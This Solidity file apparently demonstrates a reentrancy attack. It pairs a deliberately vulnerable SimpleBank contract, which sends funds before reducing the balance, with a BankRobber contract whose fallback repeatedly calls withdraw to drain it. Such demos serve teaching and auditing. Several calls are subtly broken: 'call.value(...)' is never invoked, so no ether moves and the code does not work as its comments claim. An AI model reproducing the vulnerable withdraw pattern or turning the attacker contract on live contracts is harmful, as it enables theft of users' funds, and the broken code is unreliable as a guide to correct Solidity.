pragma solidity ^0.4.24;


contract SimpleBank {
    mapping (address => uint) public balances;

    function () public payable {
        require(balances[msg.sender] + msg.value > balances[msg.sender]);
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint value) public {
        require(balances[msg.sender] >= value);

        // withdraw funds
        msg.sender.call.value(value);

        // subtract balance
        balances[msg.sender] -= value;
    }
}

contract BankRobber {
    address public bankAddress;
    uint withdrawValue = 0.1 ether; // withdraw 0.1 ether at a time
    
    constructor(address _bankAddress) public {
        bankAddress = _bankAddress;
    }
    
    // fallback function
    function () public payable {
        // call withdraw again
        bankAddress.call(bytes4(keccak256("withdraw(uint256)")), withdrawValue);
    }
    
    function attackBank() public payable {
        // deposit some funds first, call this function with ETH attached
        bankAddress.call.value(msg.value);
        
        // begin the reentrancy attack
        bankAddress.call(bytes4(keccak256("withdraw(uint256)")), withdrawValue);
    }
}